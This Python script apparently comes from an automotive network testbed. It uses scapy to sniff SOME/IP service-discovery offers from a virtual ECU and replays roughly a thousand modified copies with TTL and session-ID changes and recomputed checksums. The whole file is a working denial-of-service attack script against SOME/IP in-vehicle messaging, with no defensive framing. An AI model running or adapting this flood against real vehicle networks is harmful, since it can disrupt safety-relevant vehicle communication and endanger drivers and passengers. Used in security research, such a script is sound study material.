from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
from common import get_someip_service_info
from common import get_someip_packet
from common import SOMEIP_MSG
import time
from datetime import datetime
import struct
import numpy as np
import json
import pdb
import pickle

class vECU:
    def __init__(self, name):
        self.name = name
        self.vecu_info = json.loads(open("../vecu-info.json").read())
        self.ip = self.vecu_info[self.name]['ip']
        self.mac = self.vecu_info[self.name]['mac']

class SOMEIPService:
    def __init__(self, name):
        self.name = name
        self.srv_db = json.loads(open("../someip_service_spec.json").read())
        self.srv_info = self.srv_db[name]

class DosAttack:
    def __init__(self):
        self.vecu = vECU("ivi")
        self.someip_vehicle_speed = SOMEIPService('VehicleSpeed')

    def process_packet(self, packet):
        if packet[Ether].src == "00:00:00:00:00:08" and packet.haslayer(SD) and packet.haslayer(SDEntry_Service):
            #for entry in packet[SD].entry_array:
            #    print(f'service id: {hex(entry.srv_id)}')
            #pdb.set_trace()
            #if self.check_service(packet, self.someip_vehicle_speed):
            #    self.do_dos_attack(packet)
            self.do_dos_attack(packet)

    def check_service(self, packet, someip_service):
        # need to convert 1000 -> 0x1000
        srv_id = int('0x' + someip_service.srv_info["SERVICE_ID"], 16)
        try:
            return packet[SDEntry_Service].srv_id == srv_id
        except:
            pdb.set_trace()
            print('exception!')

    def do_dos_attack(self, packet):
        packets = []
        packet[IP].ttl = 0x4  # DoS attack IP layer TTL = 4

        for _ in range(1000):
            # original(ttl) = 0x1
            packet[SOMEIP].session_id += 1
            packet = update_udp_chksum(packet)
            packets.append(packet)

        #with open('someip_offers.pkl', 'wb') as f:
        #    pickle.dump(packets, f)
        #    exit(-1)
        '''
        with open('someip_offers.pkl', 'rb') as f:
            packets = pickle.load(f)

        #sendp(packet, iface='veth0.3', loop=1, inter=0.001)
        '''
        interval = 0.001 * random.randint(3, 5)
        print(f"start sending Dos packets({interval*1000}ms)!")
        sendp(packets, iface='veth0.3', inter=interval, count=3)

        delay = random.randint(1, 3)
        print(f"sleep {delay}sec")
        time.sleep(delay)

dos_attack = DosAttack()
filter = "udp and src host 10.0.3.8 and src port 30490 and dst port 30490"
sniff(filter=filter, iface='veth0.3', prn=dos_attack.process_packet)

